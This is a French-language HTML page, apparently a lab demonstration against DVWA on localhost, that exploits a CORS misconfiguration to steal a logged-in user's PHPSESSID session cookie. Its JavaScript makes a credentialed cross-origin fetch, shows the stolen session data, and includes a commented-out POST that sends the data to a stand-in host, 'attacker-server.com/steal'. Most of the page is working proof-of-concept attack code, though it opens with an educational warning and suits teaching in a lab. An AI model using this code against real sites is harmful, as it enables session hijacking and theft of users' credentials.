<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Attaque CORS - Exploitation</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            background-color: #f0f0f0;
        }
        .container {
            background-color: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .warning {
            background-color: #ffebee;
            border: 1px solid #f44336;
            color: #c62828;
            padding: 15px;
            border-radius: 4px;
            margin: 20px 0;
        }
        .success {
            background-color: #e8f5e8;
            border: 1px solid #4caf50;
            color: #2e7d32;
            padding: 15px;
            border-radius: 4px;
            margin: 20px 0;
        }
        .info {
            background-color: #e3f2fd;
            border: 1px solid #2196f3;
            color: #1565c0;
            padding: 15px;
            border-radius: 4px;
            margin: 20px 0;
        }
        button {
            background-color: #f44336;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            margin: 10px 5px;
        }
        button:hover {
            background-color: #d32f2f;
        }
        #result {
            background-color: #f5f5f5;
            border: 1px solid #ddd;
            padding: 15px;
            border-radius: 4px;
            margin: 20px 0;
            white-space: pre-wrap;
            font-family: monospace;
        }
        .step {
            margin: 20px 0;
            padding: 15px;
            border-left: 4px solid #2196f3;
            background-color: #f8f9fa;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üö® D√©monstration d'Attaque CORS</h1>
        
        <div class="warning">
            <strong>‚ö†Ô∏è ATTENTION :</strong> Cette page est destin√©e uniquement √† des fins √©ducatives. 
            N'utilisez ces techniques que sur vos propres syst√®mes ou avec autorisation explicite.
        </div>

        <div class="step">
            <h3>√âtape 1 : V√©rification de la vuln√©rabilit√©</h3>
            <p>Cette page va tenter d'exploiter une vuln√©rabilit√© CORS en acc√©dant √† des ressources sensibles depuis un domaine diff√©rent.</p>
            <button onclick="testCORSVulnerability()">Tester la vuln√©rabilit√© CORS</button>
        </div>

        <div class="step">
            <h3>√âtape 2 : Vol de cookie de session</h3>
            <p>Si la vuln√©rabilit√© existe, cette page peut voler le cookie de session de l'utilisateur connect√© √† DVWA.</p>
            <button onclick="stealSessionCookie()">Voler le cookie de session</button>
        </div>

        <div class="step">
            <h3>√âtape 3 : Envoi des donn√©es vol√©es</h3>
            <p>Les donn√©es vol√©es peuvent √™tre envoy√©es √† un serveur malveillant.</p>
            <button onclick="sendStolenData()">Envoyer les donn√©es vol√©es</button>
        </div>

        <div class="info">
            <h3>üìã Informations sur l'attaque :</h3>
            <ul>
                <li><strong>Cible :</strong> http://localhost:8080/vulnerable.php</li>
                <li><strong>M√©thode :</strong> Exploitation CORS avec credentials</li>
                <li><strong>R√©sultat attendu :</strong> Vol du cookie PHPSESSID</li>
            </ul>
        </div>

        <div id="result">
            <strong>R√©sultats de l'attaque :</strong><br>
            Cliquez sur les boutons ci-dessus pour commencer l'exploitation...
        </div>
    </div>

    <script>
        let stolenData = {};

        function testCORSVulnerability() {
            const resultDiv = document.getElementById('result');
            resultDiv.innerHTML = '<strong>Test de vuln√©rabilit√© CORS en cours...</strong><br>';
            
            // Test de la vuln√©rabilit√© CORS
            fetch('http://localhost:8080/vulnerable.php', {
                method: 'GET',
                credentials: 'include', // Important pour inclure les cookies
                mode: 'cors'
            })
            .then(response => {
                if (response.ok) {
                    return response.text();
                }
                throw new Error('Erreur de connexion');
            })
            .then(data => {
                resultDiv.innerHTML += '<div class="success">‚úÖ Vuln√©rabilit√© CORS confirm√©e !</div>';
                resultDiv.innerHTML += '<strong>Donn√©es re√ßues :</strong><br>';
                resultDiv.innerHTML += data;
                stolenData = JSON.parse(data);
            })
            .catch(error => {
                resultDiv.innerHTML += '<div class="warning">‚ùå √âchec de l\'exploitation : ' + error.message + '</div>';
                resultDiv.innerHTML += '<p>V√©rifiez que :</p>';
                resultDiv.innerHTML += '<ul>';
                resultDiv.innerHTML += '<li>DVWA est d√©marr√© sur http://localhost:8080</li>';
                resultDiv.innerHTML += '<li>Le fichier vulnerable.php est accessible</li>';
                resultDiv.innerHTML += '<li>Vous √™tes connect√© √† DVWA dans un autre onglet</li>';
                resultDiv.innerHTML += '</ul>';
            });
        }

        function stealSessionCookie() {
            const resultDiv = document.getElementById('result');
            
            if (stolenData.session_id || stolenData.cookies) {
                resultDiv.innerHTML += '<div class="success">üç™ Cookie de session vol√© avec succ√®s !</div>';
                resultDiv.innerHTML += '<strong>Cookie PHPSESSID :</strong> ' + (stolenData.cookies?.PHPSESSID || 'Non trouv√©') + '<br>';
                resultDiv.innerHTML += '<strong>Session ID :</strong> ' + (stolenData.session_id || 'Non trouv√©') + '<br>';
                resultDiv.innerHTML += '<strong>Timestamp :</strong> ' + (stolenData.timestamp || 'Non trouv√©') + '<br>';
            } else {
                resultDiv.innerHTML += '<div class="warning">‚ùå Aucune donn√©e de session trouv√©e. Ex√©cutez d\'abord le test de vuln√©rabilit√©.</div>';
            }
        }

        function sendStolenData() {
            const resultDiv = document.getElementById('result');
            
            if (Object.keys(stolenData).length === 0) {
                resultDiv.innerHTML += '<div class="warning">‚ùå Aucune donn√©e √† envoyer. Ex√©cutez d\'abord les √©tapes pr√©c√©dentes.</div>';
                return;
            }

            // Simulation d'envoi vers un serveur malveillant
            const maliciousServer = 'https://attacker-server.com/steal';
            
            resultDiv.innerHTML += '<div class="warning">üì° Envoi des donn√©es vol√©es vers : ' + maliciousServer + '</div>';
            resultDiv.innerHTML += '<strong>Donn√©es envoy√©es :</strong><br>';
            resultDiv.innerHTML += JSON.stringify(stolenData, null, 2);
            
            // Dans un vrai sc√©nario, on ferait :
            // fetch(maliciousServer, {
            //     method: 'POST',
            //     body: JSON.stringify(stolenData),
            //     headers: {'Content-Type': 'application/json'}
            // });
            
            resultDiv.innerHTML += '<div class="success">‚úÖ Donn√©es envoy√©es avec succ√®s (simulation)</div>';
        }

        // Test automatique au chargement de la page
        window.onload = function() {
            const resultDiv = document.getElementById('result');
            resultDiv.innerHTML += '<div class="info">üîç Page d\'exploitation CORS charg√©e. Pr√™t pour l\'attaque.</div>';
        };
    </script>
</body>
</html>
